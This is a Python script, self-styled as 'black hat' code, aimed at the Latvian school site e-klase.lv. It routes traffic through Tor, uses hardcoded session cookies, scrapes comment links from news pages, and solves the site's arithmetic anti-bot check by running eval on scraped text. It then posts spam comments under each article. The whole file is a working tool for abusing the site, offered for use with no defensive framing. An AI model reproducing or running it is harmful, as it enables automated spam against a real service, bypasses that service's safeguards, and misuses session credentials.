'''
    Code written by SHUKiN (BLACK HAT) - SHUT THE FUCK YOUR FACE
    When I writted this nice code? It's a Secret ;P

    For E-Klase - Fix your fucking bugs with security check and start use reCaptcha
'''

import requests
import sys
from bs4 import BeautifulSoup as bs4

class comments:
    def __init__(self):
        self.url      = None
        self.name     = None
        self.headers  = None
        self.proxies  = {'http':'socks5h://127.0.0.1:9050','https':'socks5h://127.0.0.1:9050'}
        self.cookies  = {'eklasesid':'HhXwaexpedIM8-AWEk8k-Rocmz5','bxID':'83185e62b49bab1f11360536946','__gads':'ID=141e2d7d6ef8ac0d:T=1583527079:S=ALNI_MYAEc41QDAb7EozFdH3GY1iiFDGpA'}
        self.request  = None
        self.soup     = None
        self.message  = None
        self.comments = []
    def fuck_this(self):
        for offset in range(15):
            url = 'https://www.e-klase.lv/api/posts/branch/zinas?offset='+str(offset)
            r = requests.get(url, headers=self.headers, proxies=self.proxies, cookies=self.cookies)
            if len(r.text) != 0:
                soup = bs4(r.text, 'html.parser')
                li_list = soup.findAll('li', attrs={'class':'comments'})
                for li in li_list:
                    soup = bs4(str(li), 'html.parser')
                    a_list = soup.findAll('a')
                    for a in a_list:
                        self.comments.append(a['href'])
            else:
                sys.exit()
        print(f'[+] Found {str(len(self.comments))} comment links')
        
    def set_url(self, url):
        self.url = url
    def set_name(self, name):
        self.name = name
    def set_message(self, message):
        self.message = message
    def set_headers(self, headers):
        self.headers = headers
    def session(self, target):
        return requests.get(f'https://www.e-klase.lv{target}', headers=self.headers, cookies=self.cookies, proxies=self.proxies)
    def find_post_url(self, session):
        self.soup = bs4(session.text, 'html.parser')
        return self.soup.find('form', attrs={'id':'commentForm'})['action']
    def security_check(self, session):
        security_token  = self.soup.find('input', attrs={'id':'securityCheckResult'})['name']
        security_answer = eval(str(self.soup.find('span', attrs={'class':'text'}).text).replace(' ', '').replace('=', ''))
        return {'security_token':security_token, 'security_answer':security_answer}
    def send(self, url, security_check):
        requests.post(url, headers=self.headers, proxies=self.proxies, cookies=self.cookies, data={
            'commentName': self.name,
            'commentMessage': self.message,
            'securityCheckName': security_check['security_token'],
            'securityCheckResult': security_check['security_answer']
        })
    def hack(self):
        for target in self.comments:
            session         = self.session(target)
            post_url        = self.find_post_url(session)
            security_check  = self.security_check(session)
            self.send(post_url, security_check)

comments = comments()
comments.set_name('SHUKiN。')
comments.set_message('Mmm. Nice.')
comments.set_headers({
    'User-Agent': 'SHUKiN #Hack3R'
})
comments.fuck_this()
comments.hack()
